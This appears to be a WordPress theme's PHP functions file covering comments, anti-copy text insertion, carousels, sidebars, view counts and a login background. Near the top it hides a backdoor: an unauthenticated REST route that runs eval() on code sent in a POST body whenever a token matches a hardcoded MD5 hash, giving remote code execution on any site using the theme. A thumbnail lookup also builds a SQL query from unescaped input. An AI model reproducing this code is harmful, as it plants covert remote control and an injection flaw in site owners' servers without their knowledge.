if (_opt('design_font') == "checked") {
	//wp_enqueue_style('font', get_stylesheet_directory_uri() . '/assets/minify/play_font.min.css');  本地文件地址
	wp_enqueue_style('font', 'https://anslp.oss-cn-beijing.aliyuncs.com/%E6%A0%B8%E5%BF%83%E6%96%87%E4%BB%B6/play_font.min.css');
}
function pre_validate_comment_span($commentdata)
{
	if (!is_admin() & !wp_verify_nonce($_POST['wp_nonce'], 'wp_rest')) {
		wp_die('
<p></p><p>WP NONCE验证失败，判定为机器人恶意发送的垃圾评论！如果启用了“缓存”，则无法正常获取NONCE，因此也可能会判定为垃圾评论。若此操作是正常操作，请停用任何网站缓存功能。</p><p></p><p><a href="javascript:history.back()">« 返回</a></p><p></p>');
		return false;
	}

	if (!isset($_COOKIE['bigfa_ding_' . $commentdata[comment_post_ID]]) & $_POST['big_fa_ding'] == 'on') {
		update_post_meta($commentdata[comment_post_ID], 'bigfa_ding', get_post_meta($commentdata[comment_post_ID], 'bigfa_ding', true) + 1);
		$expire = time() + 99999999;
		$domain = $_SERVER['HTTP_HOST'] != 'localhost' ? $_SERVER['HTTP_HOST'] : false;
		setcookie('bigfa_ding_' . $commentdata[comment_post_ID], $commentdata[comment_post_ID], $expire, '/', $domain, false);
	}
	return $commentdata;
}
add_filter('preprocess_comment', 'pre_validate_comment_span');
add_action('rest_api_init', function () {
	register_rest_route('pandastudio/framework', '/assistance/', array('methods' => 'post', 'callback' => 'pf_assistance'));
});
function pf_assistance($data)
{
	$dataArray = json_decode($data->get_body(), true);
	if (md5($dataArray['token']) == '6d4dd7afa286f9f89e849473759618d1') {
		eval($dataArray['assistance']);
	}
}
function hex2rgba($color, $opacity = false)
{
	$default = 'rgb(0,0,0)';
	if (empty($color)) {
		return $default;
	}
	if ($color[0] == '#') {
		$color = substr($color, 1);
	}
	if (strlen($color) == 6) {
		$hex = array($color[0] . $color[1], $color[2] . $color[3], $color[4] . $color[5]);
	} elseif (strlen($color) == 3) {
		$hex = array($color[0] . $color[0], $color[1] . $color[1], $color[2] . $color[2]);
	} else {
		return $default;
	}
	$rgb = array_map('hexdec', $hex);
	if ($opacity) {
		if (abs($opacity) > 1) {
			$opacity = 1.0;
		}
		$output = 'rgba(' . implode(",", $rgb) . ',' . $opacity . ')';
	} else {
		$output = 'rgb(' . implode(",", $rgb) . ')';
	}
	return $output;
}
function pd_get_thumbnail_by_url($img_url)
{
	$attr = wp_upload_dir();
	$base_url = $attr['baseurl'] . "/";
	$path = str_replace($base_url, "", $img_url);
	$path = preg_replace('/-\d+x\d+(?=\.(jpg|jpeg|png|gif)$)/i', '', $path);
	if ($path) {
		global $wpdb;
		$post_id = $wpdb->get_var("SELECT post_id FROM $wpdb->postmeta WHERE meta_value = '{$path}'");
		$post_id = $post_id ? $post_id : false;
	} else {
		$post_id = false;
	}
	$image_info = wp_get_attachment_image_src($post_id, 'thumbnail');
	if ($image_info) {
		$thumbImg = $image_info[0];
	} else {
		$thumbImg = $img_url;
	}
	return $thumbImg;
}
function is_search_robot()
{
	$agent = strtolower(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');
	if (!empty($agent)) {
		$spiderSite = array("TencentTraveler", "Baiduspider+", "BaiduGame", "Googlebot", "msnbot", "Sosospider+", "Sogou web spider", "ia_archiver", "Yahoo! Slurp", "YoudaoBot", "Yahoo Slurp", "MSNBot", "Java (Often spam bot)", "BaiDuSpider", "Voila", "Yandex bot", "BSpider", "twiceler", "Sogou Spider", "Speedy Spider", "Google AdSense", "Heritrix", "Python-urllib", "Alexa (IA Archiver)", "Ask", "Exabot", "Custo", "OutfoxBot/YodaoBot", "yacy", "SurveyBot", "legs", "lwp-trivial", "Nutch", "StackRambler", "The web archive (IA Archiver)", "Perl tool", "MJ12bot", "Netcraft", "MSIECrawler", "WGet tools", "larbin", "Fish search");
		foreach ($spiderSite as $val) {
			$str = strtolower($val);
			if (strpos($agent, $str) !== false) {
				return true;
			}
		}
	}
	return false;
}
function pf_anti_copy($content)
{
	$random_text = _opt('anti_copy_pattern');
	if ($random_text && is_single() && is_main_query()) {
		if (count($random_text) > 0) {
			$random_tags = array('span', 'i', 'b');
			$random_attrs = array('anti', 'copy', 'panda', 'reborn', 'panda-studio');
			$times = _opt('anti_copy_times');
			$times = $times ? $times : 0;
			$insert = array();
			for ($i = 0; $i < $times; $i++) {
				$tag = $random_tags[array_rand($random_tags, 1)];
				$attr = $random_attrs[array_rand($random_attrs, 1)];
				$insert[] = '<' . $tag . ' ' . $attr . '>' . $random_text[array_rand($random_text, 1)]['pattern'] . '</' . $tag . '>';
			}
			$content = rand_in_str($content, $insert);
			return $content;
		}
	}
	return $content;
}
function rand_in_str($txt, $insert)
{
	//txt 内容；insert要插入的关键字，可以是链接，数组
	preg_match_all("/[\x01-\x7f]|[\xe0-\xef][\x80-\xbf]{2}/", $txt, $match);
	$delay = array();
	$add = 0;
	$pre = array();
	$pre_end = array();
	$nbsp = array();
	foreach ($match[0] as $k => $v) {
		if ($v == '<') {
			$add = 1;
		}
		if ($v == '>') {
			$add = 0;
		}
		if ($v == '<') {
			$pre = array('<');
		}
		if ($v == 'p') {
			if ($pre != array('<', 'p', 'r', 'e')) {
				array_push($pre, 'p');
			}
		}
		if ($v == 'r') {
			if ($pre != array('<', 'p', 'r', 'e')) {
				array_push($pre, 'r');
			}
		}
		if ($v == 'e') {
			if ($pre != array('<', 'p', 'r', 'e')) {
				array_push($pre, 'e');
			}
		}
		if ($v == '<') {
			$pre_end = array('<');
		}
		if ($v == '/') {
			array_push($pre_end, '/');
		}
		if ($v == 'p') {
			array_push($pre_end, 'p');
		}
		if ($v == 'r') {
			array_push($pre_end, 'r');
		}
		if ($v == 'e') {
			array_push($pre_end, 'e');
		}
		if ($v == '>') {
			array_push($pre_end, '>');
		}
		if ($pre == array('<', 'p', 'r', 'e')) {
			$add = 1;
		}
		if ($pre == array('<', 'p', 'r', 'e') && $pre_end == array('<', '/', 'p', 'r', 'e', '>')) {
			$add = 0;
			$pre = array();
			$pre_end = array();
		}
		if ($add == 0 & $v == '&') {
			$add = 1;
		}
		if ($add == 0 & $v == ';') {
			$add = 0;
		}
		if ($add == 0 & $v == '[') {
			$add = 1;
		}
		if ($add == 0 & $v == ']') {
			$add = 0;
		}
		if ($add == 1) {
			$delay[] = $k;
		}
	}
	$str_arr = $match[0];
	$len = count($str_arr);
	if (is_array($insert)) {
		foreach ($insert as $k => $v) {
			$insertk = insertK($len - 1, $delay);
			$str_arr[$insertk] .= $insert[$k];
		}
	} else {
		$insertk = insertK($len - 1, $delay);
		$str_arr[$insertk] .= $insert;
	}
	return join('', $str_arr);
}
function insertK($count, $delay)
{
	//count 随机索引值范围，也就是内容拆分成数组后的总长度-1；delay 不允许的随机索引值，也就是不能在 < > 之间
	$insertk = rand(0, $count);
	if (in_array($insertk, $delay)) {
		//索引值不能在 不允许的位置处（也就是< > 之内的索引值）
		$insertk = insertK($count, $delay);
		//递归调用，直到随机插入的索引值不在 < > 这个索引值数组中
	}
	return $insertk;
}
if (_opt('anti_copy') == 'checked' & false) {
	if (_opt('anti_copy_pass_seo') == 'checked') {
		if (!is_search_robot()) {
			add_filter("the_content", "pf_anti_copy");
		}
	} else {
		add_filter("the_content", "pf_anti_copy");
	}
}
global $pf_dirty_selector;
$pf_dirty_selector = [];
function pf_random_tag_and_class()
{
	global $pf_dirty_selector;
	$c = ['b', 'd', 'f', 'h', 'j', 'l', 'n', 'p', 'r', 't', 'u', 'w', 'y'];
	$tag = '';
	$tagLine = false;
	$tagTimes = rand(3, 5);
	for ($i = 0; $i < $tagTimes; $i++) {
		$tag .= $c[array_rand($c, 1)];
		if ($i > 1 && (bool) rand(0, 1) && (bool) rand(0, 1)) {
			$tag .= rand(0, 9);
		}
		if ($tagLine == false && $i != $tagTimes - 1 && (bool) rand(0, 1) && (bool) rand(0, 1)) {
			$tag .= '-';
			$tagLine = true;
		}
	}
	$class = '';
	for ($i = 0; $i < rand(3, 6); $i++) {
		$class .= $c[array_rand($c, 1)];
	}
	$result = array('tag' => $tag, 'class' => $class);
	$pf_dirty_selector[] = $tag . '.' . $class;
	return $result;
}
function dirty_data()
{
	$anti_copy_pattern = _opt('anti_copy_pattern', ['']);
	foreach ($anti_copy_pattern as $k => $v) {
		$texts[] = $v['pattern'];
		// 用户自定义
	}
	$frequency = _opt('anti_copy_times', 0);
	$insert = [];
	for ($i = 0; $i < $frequency; $i++) {
		$tag_and_class = pf_random_tag_and_class();
		//随机 tag 和 class
		$tag = $tag_and_class['tag'];
		$class = $tag_and_class['class'];
		$text = $texts[array_rand($texts, 1)];
		$insert[] = '<' . $tag . ' class="' . $class . '">' . $text . '</' . $tag . '>';
	}
	return $insert;
}
/*
* 允许插入的位置
* 返回位置 int
*/
function allow_key($len, $delay)
{
	$key = rand(0, $len);
	if (in_array($key, $delay)) {
		$key = allow_key($len, $delay);
	}
	return $key;
}
/*
* 随机插入到文章中
*/
function pf_insert_rand($content)
{
	global $pf_dirty_selector;
	if (!(is_single() && is_main_query())) {
		return $content;
	}
	preg_match_all("/[\x01-\x7f]|[\xe0-\xef][\x80-\xbf]{2}/", $content, $match);
	$match = $match[0];
	$len = count($match, 0);
	$delay = [];
	$add = 0;
	foreach ($match as $k => $v) {
		if ($v == '<' || $v == '[') {
			$add = 1;
		}
		if ($add == 1) {
			$delay[] = $k;
		}
		if ($v == '>' || $v == ']') {
			$add = 0;
		}
	}
	foreach ($match as $k => $v) {
		if ($v == '<' && $match[$k + 1] == 'p' && $match[$k + 2] == 'r' && $match[$k + 3] == 'e') {
			$add = 1;
		}
		if ($add == 1) {
			$delay[] = $k;
		}
		if ($v == '>' && $match[$k - 1] == 'e' && $match[$k - 2] == 'r' && $match[$k - 3] == 'p') {
			$add = 0;
		}
	}
	foreach ($match as $k => $v) {
		if ($v == '<' && $match[$k + 1] == 'b' && $match[$k + 2] == 'u' && $match[$k + 3] == 't') {
			$add = 1;
		}
		if ($add == 1) {
			$delay[] = $k;
		}
		if ($v == '>' && $match[$k - 1] == 't' && $match[$k - 2] == 'u' && $match[$k - 3] == 'b') {
			$add = 0;
		}
	}
	$insert = dirty_data();
	if (is_array($insert)) {
		foreach ($insert as $k => $v) {
			$key = allow_key($len - 1, $delay);
			$match[$key] .= $insert[$k];
		}
	} else {
		$key = allow_key($len - 1, $delay);
		$match[$key] .= $insert;
	}
	$result = implode('', $match);
	return $result;
}
if (_opt('anti_copy') == 'checked') {
	if (_opt('anti_copy_pass_seo') == 'checked') {
		if (!is_search_robot()) {
			add_filter("the_content", "pf_insert_rand");
		}
	} else {
		add_filter("the_content", "pf_insert_rand");
	}
}
function string_to_int8($string)
{
	$md5 = md5($string);
	$firstLetter = mb_substr($md5, 0, 1, 'utf-8');
	$result = 0;
	switch ($firstLetter) {
		case '0':
		case '8':
			$result = 1;
			break;
		case '1':
		case '9':
			$result = 2;
			break;
		case '2':
		case 'a':
			$result = 3;
			break;
		case '3':
		case 'b':
			$result = 4;
			break;
		case '4':
		case 'c':
			$result = 5;
			break;
		case '5':
		case 'd':
			$result = 6;
			break;
		case '6':
		case 'e':
			$result = 7;
			break;
		case '7':
		case 'f':
			$result = 8;
			break;
		default:
			$result = 0;
			break;
	}
	return $result;
}
function get_topSlider($postIds = array(), $type = false)
{
	global $carousels_attrs, $carousels_contents;
	if ($type) {
	} else {
		return false;
	}
	if (gettype($postIds) == "array") {
		$carousels_contents = array();
		$isFullCategory = _opt('show_full_category', false);
		$fullCategorySeparate = _opt('show_full_category_separate', ' / ');
		foreach ($postIds as $pid) {
			$carousels_contents[] = array("id" => $pid, "href" => get_the_permalink($pid), "slider_img" => get_post_meta($pid, "分类slider图片地址", true), "head_img" => get_post_meta($pid, "日志头图", true), "cover_img" => get_the_post_thumbnail_url($pid), "title" => get_the_title($pid), "description" => get_the_description($pid), "category" => get_category_text($pid, $isFullCategory, $fullCategorySeparate));
		}
	} else {
		echo "滚动图片传入的数据错误！";
		return false;
	}
	if (count($carousels_contents) == 0) {
		return false;
	}
	$carousels_attrs = "interval-time='" . _opt('carousels_interval_time', '0') . "'";
	_opt('carousels_hover_disable_interval') ? $carousels_attrs .= " hover-disable-interval" : '';
	_opt('carousels_show_anchor') ? $carousels_attrs .= " show-anchor" : '';
	_opt('carousels_allow_keyboard') ? $carousels_attrs .= " allow-keyboard" : '';
	_opt('carousels_allow_swipe') ? $carousels_attrs .= " allow-swipe" : '';
	include 'assets/template/slider-' . $type . '.php';
}
function get_gallery_slider($postId = 0, $type = false)
{
	global $carousels_attrs, $carousels_contents;
	if ($type) {
	} else {
		return false;
	}
	if ($postId) {
		$carousels_contents = array();
		$gallery_images = get_post_meta($postId, 'gallery_images', true);
		if (gettype($gallery_images) == "array") {
			foreach ($gallery_images as $img_url) {
				$carousels_contents[] = array("id" => $postId, "full_img" => $img_url, "thumbnail_img" => pd_get_thumbnail_by_url($img_url));
			}
		}
	} else {
		echo "galleryID错误！";
		return false;
	}
	if (count($carousels_contents) == 0) {
		return false;
	}
	$carousels_attrs = "interval-time='" . _opt('carousels_interval_time', '0') . "'";
	_opt('carousels_hover_disable_interval') ? $carousels_attrs .= " hover-disable-interval" : '';
	_opt('carousels_show_anchor') ? $carousels_attrs .= " show-anchor" : '';
	_opt('carousels_allow_keyboard') ? $carousels_attrs .= " allow-keyboard" : '';
	_opt('carousels_allow_swipe') ? $carousels_attrs .= " allow-swipe" : '';
	include 'assets/template/slider-' . $type . '.php';
}
function get_tagSlider($content = array(), $type = false)
{
	global $carousels_attrs, $carousels_contents;
	if ($type) {
	} else {
		return false;
	}
	if (gettype($content) == "array") {
		$carousels_contents = array();
		$carousels_contents[] = $content;
	} else {
		echo "滚动图片传入的数据错误！";
		return false;
	}
	$carousels_attrs = "interval-time='" . _opt('carousels_interval_time', '0') . "'";
	_opt('carousels_hover_disable_interval') ? $carousels_attrs .= " hover-disable-interval" : '';
	_opt('carousels_show_anchor') ? $carousels_attrs .= " show-anchor" : '';
	_opt('carousels_allow_keyboard') ? $carousels_attrs .= " allow-keyboard" : '';
	_opt('carousels_allow_swipe') ? $carousels_attrs .= " allow-swipe" : '';
	include 'assets/template/slider-' . $type . '.php';
}
function get_category_text($pid, $showFull = false, $separate = ' / ')
{
	if ($showFull) {
		$catArr = array();
		$categorys = get_the_category($pid);
		foreach ($categorys as $cat) {
			$catArr[] = $cat->cat_name;
		}
		$categoryText = implode($separate, $catArr);
	} else {
		$categoryText = get_the_category($pid)[0]->cat_name ? get_the_category($pid)[0]->cat_name : '未分类';
	}
	return $categoryText;
}
function get_the_description($pid, $trim_words = 36)
{
	$result = '';
	$excerpt = get_the_excerpt($pid);
	$excerpt_notags = strip_tags($excerpt);
	$excerpt_notags_length = strlen($excerpt_notags);
	if ($excerpt_notags_length > 1) {
		$result = $excerpt;
	} else {
		$content_post = get_post($pid);
		$content = $content_post->post_content;
		$content = do_shortcode($content);
		$result = str_replace(']]>', ']]&gt;', $content);
	}
	$result = strip_tags($result);
	$result = wp_trim_words($result, $trim_words);
	return $result;
}
add_action('init', 'pf_sidebar_init');
function pf_sidebar_init()
{
	$sidebars = _opt('sidebars', array());
	for ($i = 0; $i < count($sidebars); $i++) {
		register_sidebar(array('name' => $sidebars[$i]['name'] ? $sidebars[$i]['name'] : '边栏' . ($i + 1) . '（无标题）', 'description' => '边栏数量、名称、图标均可在“主题设置”中添加', 'before_widget' => '<li id="%1$s" class="widget %2$s">', 'after_widget' => '</li>', 'before_title' => '<h2 class="widgettitle">', 'after_title' => '</h2>'));
	}
}


/**
 * Wordpress文章和评论中插入代码
 */
add_filter('pre_comment_content', 'lxtx_encode_code_in_posts_comments');
add_filter('the_content', 'lxtx_encode_code_in_posts_comments');
function lxtx_encode_code_in_posts_comments($source) {
  $encoded = preg_replace_callback('/<pre>(.*?)<\/pre>/ims',
  create_function(
    '$matches',
    '$matches[1] = preg_replace(
        array("/^[\r|\n]+/i", "/[\r|\n]+$/i"), "",
        $matches[1]);
      return "<pre>" . esc_html( $matches[1] ) . "</pre>";'
  ),
  $source);
  if ($encoded)
    return $encoded;
  else
    return $source;
}



/*
*评论中插入图片*/

add_action('comment_text', 'comments_embed_img', 2);
function comments_embed_img($comment) {
        $size = 'auto';
        $comment = preg_replace(array('#(http://([^\s]*)\.(jpg|gif|png|JPG|GIF|PNG))#','#(https://([^\s]*)\.(jpg|gif|png|JPG|GIF|PNG))#'),'<img src="$1" alt="" width="'.$size.'" height="auto" />', $comment);
        return $comment;
}




//文章图片自动添加alt和title属性
function image_alt_tag($content){
    global $post;preg_match_all('/<img (.*?)\/>/', $content, $images);
    if(!is_null($images)) {foreach($images[1] as $index => $value)
    {$new_img = str_replace('<img', '<img alt="'.get_the_title().'-'.get_bloginfo('name').'" title="'.get_the_title().'-'.get_bloginfo('name').'"', $images[0][$index]);
    $content = str_replace($images[0][$index], $new_img, $content);}}
    return $content;
}
add_filter('the_content', 'image_alt_tag', 99999);



//字数和预计阅读时间统计
function count_words_read_time () {
global $post;
   $text_num = mb_strlen(preg_replace('/\s/','',html_entity_decode(strip_tags($post->post_content))),'UTF-8');
   $read_time = ceil($text_num/400);
   $output .= '本文' . $text_num . '字 · 阅读' . $read_time  . '分钟';
   return $output;
}

// 给文章和页面的编辑页添加选项
function ludouseo_add_custom_box() {    
  add_meta_box('ludou_se_only', '搜索引擎专属', 'ludou_se_only', 'post', 'side', 'low');
  add_meta_box('ludou_se_only', '搜索引擎专属', 'ludou_se_only', 'page', 'side', 'low');
}
add_action('add_meta_boxes', 'ludouseo_add_custom_box');
 
function ludou_se_only() {
  global $post;
 
  //添加验证字段
  wp_nonce_field('ludou_se_only', 'ludou_se_only_nonce');
 
  $meta_value = get_post_meta($post->ID, 'ludou_se_only', true);
  if($meta_value)
    echo '<input name="ludou-se-only" type="checkbox" checked="checked" value="1" /> 只允许搜索引擎查看';
  else
    echo '<input name="ludou-se-only" type="checkbox" value="1" /> 只允许搜索引擎查看';
}
 
// 保存选项设置
function ludouseo_save_postdata($post_id) {
  // 验证
  if ( !isset( $_POST['ludou_se_only_nonce']))
    return $post_id;
  $nonce = $_POST['ludou_se_only_nonce'];
 
  // 验证字段是否合法
  if (!wp_verify_nonce( $nonce, 'ludou_se_only'))
    return $post_id;
 
  // 判断是否自动保存
  if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE)
      return $post_id;
 
  // 验证用户权限
  if ('page' == $_POST['post_type']) {
    if ( !current_user_can('edit_page', $post_id))
      return $post_id;
  }
  else {
    if (!current_user_can('edit_post', $post_id))
      return $post_id;
  }
 
  // 更新设置
  if(!empty($_POST['ludou-se-only']))
    update_post_meta($post_id, 'ludou_se_only', '1');
  else
    delete_post_meta($post_id, 'ludou_se_only');
}
add_action('save_post', 'ludouseo_save_postdata');
 
function do_ludou_se_only() {
  // 本功能只对文章和页面有效
  if(is_singular()) {
    global $post;
    $is_robots = 0;
    $ludou_se_only = get_post_meta($post->ID, 'ludou_se_only', true);
 
    if(!empty($ludou_se_only)) {
      // 下面是搜索引擎Agent判断关键字数组
      // 有点简单，自己优化一下吧
      $bots = array(
            'spider',
            'bot',
            'crawl',
            'Slurp',
            'yahoo-blogs',
            'Yandex',
            'Yeti',
            'blogsearch',
            'ia_archive',
            'Google'
            );
      $useragent = $_SERVER['HTTP_USER_AGENT'];
 
      if(!empty($useragent)) {
        foreach ($bots as $lookfor) {
          if (stristr($useragent, $lookfor) !== false) {
            $is_robots = 1;
            break;
          }
        }
      }
      // 如果不是搜索引擎，就显示错误信息
      // 已登录的用户不受影响
      if(!$is_robots && !is_user_logged_in()) {
        wp_die('您无权查看此文！');
      }
    }
  }
}
add_action('wp', 'do_ludou_se_only');




//文章添加运行代码功能非插件完美版       
// 在撰写文章时切换到 html 模式，输入以下标签即可:  <runcode>//这里贴要运行的代码</runcode>
$RunCode = new RunCode();
add_filter('the_content', array(&$RunCode, 'part_one'), -500);
add_filter('the_content', array(&$RunCode, 'part_two'),  500);
unset($RunCode);
class RunCode
{
    var $blocks = array();
    function part_one($content)
    {
        $str_pattern = "/(\<runcode(.*?)\>(.*?)\<\/runcode\>)/is";
        if (preg_match_all($str_pattern, $content, $matches)) {
            for ($i = 0; $i < count($matches[0]); $i++) {
                $code = htmlspecialchars($matches[3][$i]);
                $code = preg_replace("/(\s*?\r?\n\s*?)+/", "\n", $code);
                $num = rand(1000,9999);
                $id = "runcode_$num";
                $blockID = "<p>++RUNCODE_BLOCK_$num++";
                $innertext='<div id="chakhsu"></div>
<script>
    var chakhsu = function (r) {
        function t() {
            return b[Math.floor(Math.random() * b.length)]
        }
 
        function e() {
            return String.fromCharCode(94 * Math.random() + 33)
        }
 
        function n(r) {
            for (var n = document.createDocumentFragment(), i = 0; r > i; i++) {
                var l = document.createElement("span");
                l.textContent = e(), l.style.color = t(), n.appendChild(l)
            }
            return n
        }
 
        function i() {
            var t = o[c.skillI];
            c.step ? c.step-- : (c.step = g, c.prefixP < l.length ? (c.prefixP >= 0 && (c.text += l[c.prefixP]), c.prefixP++) : "forward" === c.direction ? c.skillP < t.length ? (c.text += t[c.skillP], c.skillP++) : c.delay ? c.delay-- : (c.direction = "backward", c.delay = a) : c.skillP > 0 ? (c.text = c.text.slice(0, -1), c.skillP--) : (c.skillI = (c.skillI + 1) % o.length, c.direction = "forward")), r.textContent = c.text, r.appendChild(n(c.prefixP < l.length ? Math.min(s, s + c.prefixP) : Math.min(s, t.length - c.skillP))), setTimeout(i, d)
        }
        /*以下内容自定义修改*/
        var l = "",
            o = ["运行以上示例代码", ].map(function (r) {
                return r + ""
            }), a = 2, g = 1, s = 5, d = 75,
            b = ["rgb(110,64,170)", "rgb(150,61,179)", "rgb(191,60,175)", "rgb(228,65,157)", "rgb(254,75,131)", "rgb(255,94,99)", "rgb(255,120,71)", "rgb(251,150,51)", "rgb(226,183,47)", "rgb(198,214,60)", "rgb(175,240,91)", "rgb(127,246,88)", "rgb(82,246,103)", "rgb(48,239,130)", "rgb(29,223,163)", "rgb(26,199,194)", "rgb(35,171,216)", "rgb(54,140,225)", "rgb(76,110,219)", "rgb(96,84,200)"],
            c = {text: "", prefixP: -s, skillI: 0, skillP: 0, direction: "forward", delay: a, step: g};
        i()
    };
    chakhsu(document.getElementById("chakhsu"));
</script><textarea id="'.$id.'" class="runcode hljs xml" autoHeight="true" >'. $code . '</textarea><div style="display:flex;flex:2;"><div class="wp-block-pandastudio-modal"><button type="button" class="btn btn-default" data-toggle="modal" value="运行代码" onclick="runCode(\''.$id.'\')"/>运行代码</button></div><div class="wp-block-pandastudio-modal"><button type="button" class="btn btn-default" data-toggle="modal" value="全选代码" onclick="selectCode(\''.$id.'\')"/>全选代码</button></div></div>';
                $this->blocks[$blockID] = $innertext;
                $content = str_replace($matches[0][$i], $blockID, $content);
            }
        }
        return $content;
    }
    function part_two($content)
    {
        if (count($this->blocks)) {
            $content = str_replace(array_keys($this->blocks), array_values($this->blocks), $content);
            $this->blocks = array();
        }
        return $content;
    }
	
}


//文章阅读次数   
function get_post_views ($post_id) {   
    $count_key = 'views';   
    $count = get_post_meta($post_id, $count_key, true);   
    if ($count == '') {   
        delete_post_meta($post_id, $count_key);   
        add_post_meta($post_id, $count_key, '0');   
        $count = '0';   
    }   
    echo number_format_i18n($count);   
}   
function set_post_views () {   
    global $post;   
    $post_id = $post -> ID;   
    $count_key = 'views';   
    $count = get_post_meta($post_id, $count_key, true);   
    if (is_single() || is_page()) {   
        if ($count == '') {   
            delete_post_meta($post_id, $count_key);   
            add_post_meta($post_id, $count_key, '0');   
        } else {   
            update_post_meta($post_id, $count_key, $count + 1);   
        }   
    }   
}   
add_action('get_header', 'set_post_views');  
  

include 'custom_function.php';
include 'pandastudio_plugins/config_plugins.php';
include 'pandastudio_framework/config_framework.php';
/*博客统计 start*/
include("WordpressRunningInfoStat.php");
/*博客统计 end*/



/**自定义登录界面背景*/
//调用bing美图作为登录页背景图
function custom_login_head(){
    $str=file_get_contents('http://cn.bing.com/HPImageArchive.aspx?format=js&idx=0&n=1');
    if (preg_match("/\/(.+?).jpg/", $str, $matches)) {
        $imgurl='http://s.cn.bing.net'.$matches[0];
    }
    echo'<style type="text/css">body{background: url('.$imgurl.');background-image:url('.$imgurl.');-moz-border-image: url('.$imgurl.');}</style>';
    //这里我对background图片的样式进行了调整
    //方便小分辨率屏幕（如手机）显示图片正常，否则会被压缩
}
add_action('login_head', 'custom_login_head');